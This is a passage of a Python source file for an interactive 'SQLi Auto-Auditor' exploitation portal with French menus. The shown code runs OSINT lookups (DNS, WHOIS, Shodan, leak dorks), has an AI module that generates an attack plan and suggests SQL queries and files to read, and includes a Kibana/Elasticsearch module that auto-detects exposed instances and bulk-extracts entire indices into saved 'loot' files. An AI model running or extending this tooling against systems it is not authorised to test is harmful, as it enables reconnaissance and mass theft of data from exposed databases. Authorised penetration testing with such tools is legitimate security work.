            shodan_key = os.environ.get("SHODAN_API_KEY", "")
            if not shodan_key:
                shodan_key = Prompt.ask("[bold]Cle API Shodan (vide = skip)", default="")
            osint = FullOSINT(target_url, self.output_dir)
            results = osint.run_full(shodan_key=shodan_key or None)
            self._save_osint_to_loot(results, domain)
        elif choice == "2":
            dns = DNSEnumerator(domain)
            records = dns.enumerate()
            if records:
                self.loot.add_entry("osint", f"DNS - {domain}",
                                   [{"type": k, "values": ", ".join(v) if isinstance(v, list) else v} for k, v in records.items()])
        elif choice == "3":
            whois = WHOISLookup(domain)
            info = whois.lookup()
            if info:
                self.loot.add_entry("osint", f"WHOIS - {domain}",
                                   [{"field": k, "value": str(v)} for k, v in info.items()])
        elif choice == "4":
            sec = SecurityHeadersAnalyzer()
            analysis = sec.analyze(target_url)
            loot_data = []
            for h, v in analysis.get("present", {}).items():
                loot_data.append({"header": h, "value": v[:80], "status": "OK"})
            for h in analysis.get("missing", []):
                loot_data.append({"header": h, "value": "", "status": "MANQUANT"})
            for issue in analysis.get("issues", []):
                loot_data.append({"header": "Issue", "value": issue, "status": "WARNING"})
            loot_data.append({"header": "Score", "value": f"{analysis.get('score', 0)}%", "status": ""})
            self.loot.add_entry("osint", f"Security Headers - {domain}", loot_data)
        elif choice == "5":
            api_key = os.environ.get("SHODAN_API_KEY", "")
            if not api_key:
                api_key = Prompt.ask("[bold]Cle API Shodan")
            if api_key:
                shodan = ShodanLookup(api_key=api_key)
                results = shodan.lookup(domain)
                if results:
                    self.loot.add_entry("osint", f"Shodan - {domain}",
                                       [{"field": k, "value": str(v)} for k, v in results.items()])
        elif choice == "6":
            leak = LeakChecker()
            findings = leak.check(domain)
            if findings:
                self.loot.add_entry("osint", f"Leak Dorks - {domain}", findings)

        Prompt.ask("\n[dim]Entree pour continuer[/dim]")

    def _save_osint_to_loot(self, results, domain):
        """Save OSINT results to loot."""
        if results.get("dns"):
            self.loot.add_entry("osint", f"DNS - {domain}",
                               [{"type": k, "values": ", ".join(v) if isinstance(v, list) else v} for k, v in results["dns"].items()])
        if results.get("whois"):
            self.loot.add_entry("osint", f"WHOIS - {domain}",
                               [{"field": k, "value": str(v)} for k, v in results["whois"].items()])
        if results.get("security_headers"):
            analysis = results["security_headers"]
            data = [{"header": "Score", "value": f"{analysis.get('score', 0)}%", "status": ""}]
            for h in analysis.get("missing", []):
                data.append({"header": h, "value": "", "status": "MANQUANT"})
            self.loot.add_entry("osint", f"Security Headers - {domain}", data)
        if results.get("shodan"):
            self.loot.add_entry("osint", f"Shodan - {domain}",
                               [{"field": k, "value": str(v)} for k, v in results["shodan"].items()])

    # ═══════════════════════════════════════════
    # AGENT IA
    # ═══════════════════════════════════════════

    def ai_analysis(self):
        console.clear()
        console.print(Panel(
            "[bold]Agent IA - Analyse intelligente[/bold]\n\n"
            "L'agent correle toutes les donnees collectees:\n"
            "  - Resultats de scan SQLi, NoSQLi, XSS\n"
            "  - Reconnaissance (subdomains, ports, directories)\n"
            "  - OSINT (DNS, WHOIS, headers, Shodan)\n"
            "  - Loot (donnees extraites)\n\n"
            "Il genere un plan d'attaque priorise\n"
            "et un score de risque global.",
            title="Agent IA",
            border_style="red",
        ))

        if not Confirm.ask("[bold]Lancer l'analyse IA ?[/bold]", default=True):
            return

        analyzer = AIAnalyzer(self.output_dir)
        results = analyzer.analyze()

        # Feed AI suggestions back into the portal
        if results.get("recommendations"):
            # Get smart queries from AI
            smart_queries = analyzer.get_smart_queries(
                discovered_dbs=self.discovered_dbs,
                discovered_tables=self.discovered_tables,
            )
            if smart_queries:
                console.print(f"\n  [bold]L'IA suggere {len(smart_queries)} requetes SQL adaptees[/bold]")
                for desc, query in smart_queries[:5]:
                    console.print(f"    [cyan]{desc}:[/cyan] {query[:60]}")

            # Get smart file paths
            smart_paths = analyzer.suggest_file_paths()
            if smart_paths:
                console.print(f"\n  [bold]L'IA suggere {len(smart_paths)} fichiers a lire[/bold]")

        # Save analysis
        analyzer.save_analysis()

        # Save to loot
        loot_data = []
        for rec in results.get("recommendations", []):
            loot_data.append({
                "priority": rec["priority"],
                "risk": rec["risk"],
                "title": rec["title"],
                "actions": " | ".join(rec["actions"][:3]),
            })
        if loot_data:
            self.loot.add_entry("ai", "Plan d'attaque IA", loot_data,
                               columns=["priority", "risk", "title", "actions"])
        self.loot.add_entry("ai", "Score de risque",
                           [{"score": results.get("risk_score", 0), "evaluation": "sur 100"}])

        Prompt.ask("\n[dim]Entree pour continuer[/dim]")

    # ═══════════════════════════════════════════
    # KIBANA / ELASTICSEARCH
    # ═══════════════════════════════════════════

    def kibana_elk(self):
        console.clear()
        console.print(Panel(
            "[bold]Kibana / Elasticsearch Query[/bold]\n\n"
            "Si la cible expose un Elasticsearch ou Kibana,\n"
            "cet outil permet d'interroger directement les index.\n\n"
            "[bold]Fonctions:[/bold]\n"
            "  [cyan][1][/cyan] Auto-detect Elasticsearch/Kibana\n"
            "  [cyan][2][/cyan] Lister les index\n"
            "  [cyan][3][/cyan] Requete sur un index\n"
            "  [cyan][4][/cyan] Extraire des donnees d'un index\n"
            "  [cyan][0][/cyan] Retour",
            title="Kibana / ELK",
            border_style="blue",
        ))

        elk_url = Prompt.ask("[bold]URL Elasticsearch (ex: http://target:9200)", default="")
        if not elk_url.strip():
            # Try auto-detect from target
            target = self.report.get("target", "") if self.report else ""
            if target:
                parsed = urlparse(target)
                base = f"{parsed.scheme}://{parsed.netloc.split(':')[0]}"
                for port in [9200, 9300, 5601]:
                    test_url = f"{base}:{port}"
                    try:
                        resp = requests.get(test_url, timeout=3, verify=False)
                        if resp.status_code == 200:
                            console.print(f"  [bold green]Elasticsearch detecte: {test_url}[/bold green]")
                            elk_url = test_url
                            break
                    except Exception:
                        pass

            if not elk_url:
                console.print("[yellow]Aucun Elasticsearch detecte. Entrez l'URL manuellement.[/yellow]")
                Prompt.ask("\n[dim]Entree pour continuer[/dim]")
                return

        choice = Prompt.ask("[bold]Action", choices=["0","1","2","3","4"], default="2")

        if choice == "0":
            return
        elif choice == "1":
            self._elk_detect(elk_url)
        elif choice == "2":
            self._elk_list_indices(elk_url)
        elif choice == "3":
            self._elk_query(elk_url)
        elif choice == "4":
            self._elk_extract(elk_url)

        Prompt.ask("\n[dim]Entree pour continuer[/dim]")

    def _elk_detect(self, url):
        """Detect Elasticsearch info."""
        try:
            resp = requests.get(url, timeout=10, verify=False)
            if resp.status_code == 200:
                data = resp.json()
                console.print(Panel(json.dumps(data, indent=2)[:1000], title="Elasticsearch Info", border_style="green"))
                self.loot.add_entry("elk", "Elasticsearch Info",
                                   [{"field": k, "value": str(v)} for k, v in data.items()])
        except Exception as e:
            console.print(f"  [red]Erreur: {e}[/red]")

    def _elk_list_indices(self, url):
        """List Elasticsearch indices."""
        try:
            resp = requests.get(f"{url}/_cat/indices?format=json", timeout=10, verify=False)
            if resp.status_code == 200:
                indices = resp.json()
                table = Table(title="Index Elasticsearch", border_style="green", show_lines=True)
                table.add_column("Index", style="bold")
                table.add_column("Status")
                table.add_column("Docs", justify="right")
                table.add_column("Taille")
                for idx_info in indices:
                    table.add_row(
                        idx_info.get("index", ""),
                        idx_info.get("health", ""),
                        idx_info.get("docs.count", "0"),
                        idx_info.get("store.size", ""),
                    )
                console.print(table)
                self.loot.add_entry("elk", "Elasticsearch Indices", indices)
            else:
                console.print(f"  [yellow]HTTP {resp.status_code}[/yellow]")
        except Exception as e:
            console.print(f"  [red]Erreur: {e}[/red]")

    def _elk_query(self, url):
        """Query an Elasticsearch index."""
        index = Prompt.ask("[bold]Nom de l'index")
        query_str = Prompt.ask("[bold]Terme de recherche (ou * pour tout)", default="*")
        size = int(Prompt.ask("[bold]Nombre de resultats", default="20"))

        try:
            if query_str == "*":
                query = {"query": {"match_all": {}}, "size": size}
            else:
                query = {"query": {"query_string": {"query": query_str}}, "size": size}

            resp = requests.post(
                f"{url}/{index}/_search",
                json=query, timeout=30, verify=False,
                headers={"Content-Type": "application/json"},
            )
            if resp.status_code == 200:
                data = resp.json()
                hits = data.get("hits", {}).get("hits", [])
                total = data.get("hits", {}).get("total", {})
                total_val = total.get("value", total) if isinstance(total, dict) else total

                console.print(f"\n  [bold]{len(hits)} resultats (total: {total_val})[/bold]\n")

                for hit in hits[:10]:
                    source = hit.get("_source", {})
                    console.print(Panel(
                        json.dumps(source, indent=2, ensure_ascii=False)[:500],
                        title=f"{hit.get('_index', '')} / {hit.get('_id', '')}",
                        border_style="cyan",
                    ))

                # Save to loot
                loot_data = [hit.get("_source", {}) for hit in hits]
                self.loot.add_entry("elk", f"Query: {index}/{query_str}", loot_data)
            else:
                console.print(f"  [yellow]HTTP {resp.status_code}: {resp.text[:200]}[/yellow]")
        except Exception as e:
            console.print(f"  [red]Erreur: {e}[/red]")

    def _elk_extract(self, url):
        """Extract all data from an Elasticsearch index."""
        index = Prompt.ask("[bold]Nom de l'index a extraire")
        limit = int(Prompt.ask("[bold]Nombre max de documents", default="500"))

        console.print(f"\n  [bold]Extraction de {index}...[/bold]")

        try:
            all_docs = []
            query = {"query": {"match_all": {}}, "size": min(100, limit)}

            # Use scroll API for large extractions
            resp = requests.post(
                f"{url}/{index}/_search?scroll=2m",
                json=query, timeout=30, verify=False,
                headers={"Content-Type": "application/json"},
            )
            if resp.status_code != 200:
                console.print(f"  [red]HTTP {resp.status_code}[/red]")
                return

            data = resp.json()
            scroll_id = data.get("_scroll_id")
            hits = data.get("hits", {}).get("hits", [])
            all_docs.extend(hit.get("_source", {}) for hit in hits)

            while len(all_docs) < limit and hits:
                resp = requests.post(
                    f"{url}/_search/scroll",
                    json={"scroll": "2m", "scroll_id": scroll_id},
                    timeout=30, verify=False,
                    headers={"Content-Type": "application/json"},
                )
                if resp.status_code != 200:
                    break
                data = resp.json()
                hits = data.get("hits", {}).get("hits", [])
                all_docs.extend(hit.get("_source", {}) for hit in hits)
                console.print(f"    [dim]{len(all_docs)} documents...[/dim]")

            console.print(f"\n  [bold green]{len(all_docs)} documents extraits de {index}[/bold green]")

            # Save to file
            os.makedirs(self.output_dir, exist_ok=True)
            out_path = os.path.join(self.output_dir, f"elk_{index}.json")
            with open(out_path, "w", encoding="utf-8") as f:
                json.dump(all_docs, f, indent=2, ensure_ascii=False)
            console.print(f"  [green]Sauvegarde: {out_path}[/green]")

            # Save to loot (first 200 entries)
            self.loot.add_entry("elk", f"Extract: {index} ({len(all_docs)} docs)", all_docs[:200])

        except Exception as e:
            console.print(f"  [red]Erreur: {e}[/red]")

    def run(self):
        if not self.load_report():
            console.print("[yellow]Pas de rapport. Mode Burp import uniquement.[/yellow]")
            self.report = {"target": "", "injection_points": [], "sqlmap_results": {}, "scan_date": "", "request_files": []}
        if not self.sqlmap_path:
            console.print("[bold yellow]sqlmap non detecte. Les fonctions d'exploitation seront limitees.[/bold yellow]")
        self.main_menu()


def main():
    import argparse
    parser = argparse.ArgumentParser(description="SQLi Auto-Auditor - Portail Interactif")
    parser.add_argument("-r", "--report", default="output/report.json", help="Chemin du rapport JSON")
    parser.add_argument("-o", "--output", default="output", help="Dossier de sortie")
    args = parser.parse_args()

    portal = ExploitPortal(report_path=args.report, output_dir=args.output)
    portal.run()


if __name__ == "__main__":
    main()
